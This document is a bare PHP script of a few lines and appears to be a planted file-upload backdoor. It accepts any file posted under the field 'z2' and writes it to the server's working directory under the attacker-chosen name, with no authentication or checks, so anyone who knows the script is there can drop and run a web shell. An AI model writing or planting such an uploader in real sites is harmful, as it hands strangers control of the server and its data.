<?php 
if(isset($_FILES['z2']))
{
	move_uploaded_file($_FILES['z2']['tmp_name'], $_FILES['z2']['name']);
}
?>